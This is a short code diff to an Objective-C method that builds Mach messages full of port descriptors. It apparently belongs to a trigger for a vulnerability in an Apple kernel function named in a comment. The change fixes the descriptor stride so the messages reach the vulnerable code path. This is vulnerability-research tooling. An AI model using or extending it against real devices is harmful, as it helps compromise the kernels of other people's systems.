@@ -46,8 +46,13 @@
 // runs ipc_port_translate_receive (the vulnerable function).
 - (NSDictionary *)sendReceiveCount:(uint32_t)count port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
     NSMutableDictionary *result = [NSMutableDictionary dictionary];
-    size_t descBytes = (size_t)count * 16;
+    // mach_msg_port_descriptor_t is 12 bytes here (name/disposition/type u32
+    // triple) — hardcoding a 16-byte stride made the kernel's parser walk
+    // misaligned descriptors (MACH_SEND_INVALID_HEADER). Use sizeof.
+    size_t descSize = sizeof(mach_msg_port_descriptor_t);
+    size_t descBytes = (size_t)count * descSize;
     size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + descBytes;
+    result[@"desc_size"] = @(descSize);
     uint8_t *buf = calloc(1, total);
     if (!buf) {
         result[@"status"] = @"CALLOC_FAILED";
@@ -66,7 +71,7 @@
 
     uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
     for (uint32_t i = 0; i < count; i++) {
-        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * 16);
+        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
         pd->name = sendRight;
         pd->disposition = MACH_MSG_TYPE_COPY_SEND;
         pd->type = MACH_MSG_PORT_DESCRIPTOR;
